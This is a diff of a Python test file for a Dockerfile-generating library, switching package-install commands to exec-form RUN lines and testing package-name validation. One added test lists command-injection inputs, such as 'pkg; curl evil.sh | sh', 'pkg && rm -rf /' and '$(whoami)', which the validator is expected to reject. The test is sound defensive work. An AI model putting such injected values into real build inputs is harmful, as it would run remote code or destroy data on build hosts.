@@ -138,7 +138,7 @@ class TestDockerfile:
     def test_brew_install(self) -> None:
         spec = ImageSpec.from_registry("base", pin_digest=False).brew_install("jq")
         df = spec.to_dockerfile()
-        assert "brew install jq" in df
+        assert '["brew", "install", "jq"]' in df
 
     def test_nvm_install(self) -> None:
         spec = ImageSpec.from_registry("base", pin_digest=False).nvm_install("20")
@@ -149,12 +149,12 @@ class TestDockerfile:
     def test_npm_install(self) -> None:
         spec = ImageSpec.from_registry("base", pin_digest=False).npm_install("typescript")
         df = spec.to_dockerfile()
-        assert "npm install -g typescript" in df
+        assert '["npm", "install", "-g", "typescript"]' in df
 
     def test_dnf_install(self) -> None:
         spec = ImageSpec.from_registry("base", pin_digest=False).dnf_install("git", "curl")
         df = spec.to_dockerfile()
-        assert "dnf install -y curl git" in df
+        assert '["dnf", "install", "-y", "curl", "git"]' in df
         assert "--mount=type=cache,target=/var/cache/dnf" in df
 
     def test_env_value_with_spaces_quoted(self) -> None:
@@ -198,6 +198,124 @@ class TestDockerfile:
         from containerspec.renderers import validate_package
 
         assert validate_package("huggingface_hub[hf_transfer]") == "huggingface_hub[hf_transfer]"
+
+    def test_pep508_version_specifiers_are_valid(self) -> None:
+        """PEP 508 version specifiers are accepted (safe under exec-form RUN)."""
+        from containerspec.renderers import validate_package
+
+        for pkg in [
+            "httpx>=0.27.0",
+            "numpy<2.0",
+            "rich>12.0",
+            "packaging!=22.0",
+            "uvicorn~=0.30",
+            "fastapi[all]>=0.110,<0.120",
+            "pydantic>=2.0,<3,!=2.5.0",
+        ]:
+            assert validate_package(pkg) == pkg
+
+    def test_npm_scoped_and_semver_specifiers_are_valid(self) -> None:
+        """npm scoped packages and semver range chars are accepted (exec-form safe)."""
+        from containerspec.renderers import validate_package
+
+        for pkg in [
+            "@types/node",
+            "@angular/core@^17.0.0",
+            "typescript@~5.4.0",
+            "react@#semver:^18.0.0",
+        ]:
+            assert validate_package(pkg) == pkg
+
+    def test_shell_metacharacters_still_rejected(self) -> None:
+        """Defense-in-depth: shell injection chars are rejected even with exec form."""
+        from containerspec.renderers import validate_package
+
+        for evil in [
+            "pkg; curl evil.sh | sh",
+            "pkg && rm -rf /",
+            "pkg$(whoami)",
+            "pkg`whoami`",
+            "pkg > /etc/passwd",
+            "pkg & background",
+            "pkg$(curl evil)",
+            "pkg $(id)",
+            "name with spaces",
+        ]:
+            with pytest.raises(ValueError, match="Invalid package name"):
+                validate_package(evil)
+
+    def test_pip_install_renders_exec_form(self) -> None:
+        """pip_install emits exec-form RUN with a JSON array (no shell)."""
+        spec = ImageSpec.from_registry("base", pin_digest=False).pip_install("httpx")
+        df = spec.to_dockerfile()
+        assert '["pip", "install", "--no-cache-dir", "httpx"]' in df
+        # No shell-form "pip install httpx" (space-separated) anywhere.
+        assert "pip install --no-cache-dir httpx" not in df
+
+    def test_pip_install_version_specifier_in_exec_form(self) -> None:
+        """A PEP 508 specifier is carried verbatim inside the exec JSON array."""
+        spec = ImageSpec.from_registry("base", pin_digest=False).pip_install("httpx>=0.27.0")
+        df = spec.to_dockerfile()
+        assert '["pip", "install", "--no-cache-dir", "httpx>=0.27.0"]' in df
+
+    def test_apt_install_splits_into_env_update_install(self) -> None:
+        """apt_install emits ENV + separate exec-form update and install RUN lines."""
+        spec = ImageSpec.from_registry("base", pin_digest=False).apt_install("git", "curl")
+        df = spec.to_dockerfile()
+        assert "ENV DEBIAN_FRONTEND=noninteractive" in df
+        assert '["apt-get", "update"]' in df
+        assert '["apt-get", "install", "-y", "--no-install-recommends", "curl", "git"]' in df
+        # The old shell-form chained command must be gone.
+        assert "apt-get update && apt-get install" not in df
+
+    def test_uv_pip_install_sets_env_then_exec(self) -> None:
+        spec = ImageSpec.from_registry("base", pin_digest=False).uv_pip_install("vllm")
+        df = spec.to_dockerfile()
+        assert "ENV UV_LINK_MODE=copy" in df
+        assert '["uv", "pip", "install", "vllm"]' in df
+        assert "UV_LINK_MODE=copy uv pip install" not in df
+
+    def test_pacman_install_splits_install_and_clean(self) -> None:
+        spec = ImageSpec.from_registry("base", pin_digest=False).pacman_install("ripgrep")
+        df = spec.to_dockerfile()
+        assert '["pacman", "-S", "--noconfirm", "--needed", "ripgrep"]' in df
+        assert '["pacman", "-Scc", "--noconfirm"]' in df
+
+    def test_zypper_install_splits_install_and_clean(self) -> None:
+        spec = ImageSpec.from_registry("base", pin_digest=False).zypper_install("git")
+        df = spec.to_dockerfile()
+        assert '["zypper", "install", "-y", "git"]' in df
+        assert '["zypper", "clean", "-a"]' in df
+
+    def test_dnf_install_splits_install_and_clean(self) -> None:
+        spec = ImageSpec.from_registry("base", pin_digest=False).dnf_install("git")
+        df = spec.to_dockerfile()
+        assert '["dnf", "install", "-y", "git"]' in df
+        assert '["dnf", "clean", "all"]' in df
+
+    def test_pnpm_install_splits_pnpm_bootstrap_and_add(self) -> None:
+        spec = ImageSpec.from_registry("base", pin_digest=False).pnpm_install("react")
+        df = spec.to_dockerfile()
+        assert '["npm", "install", "-g", "pnpm"]' in df
+        assert '["pnpm", "add", "-g", "react"]' in df
+
+    def test_brew_install_setup_shell_then_exec_packages(self) -> None:
+        """brew keeps its setup script in shell form; packages use exec form."""
+        spec = ImageSpec.from_registry("base", pin_digest=False).brew_install("jq", "yq")
+        df = spec.to_dockerfile()
+        # Setup script remains shell-form (library code, no user input).
+        assert "command -v brew" in df
+        # Packages are installed via exec form, after ENV PATH.
+        assert "ENV PATH=/home/linuxbrew/.linuxbrew/bin:$PATH" in df
+        assert '["brew", "install", "jq", "yq"]' in df
+        # No shell-form "brew install jq yq" with the user packages.
+        assert "brew install jq yq" not in df
+
+    def test_apk_install_renders_exec_form(self) -> None:
+        spec = ImageSpec.from_registry("base", pin_digest=False).apk_install("curl", "git")
+        df = spec.to_dockerfile()
+        assert '["apk", "add", "--no-cache", "curl", "git"]' in df
+        assert "apk add --no-cache curl git" not in df
 
     def test_nvm_install_has_pipefail(self) -> None:
         spec = ImageSpec.from_registry("base", pin_digest=False).nvm_install("22")
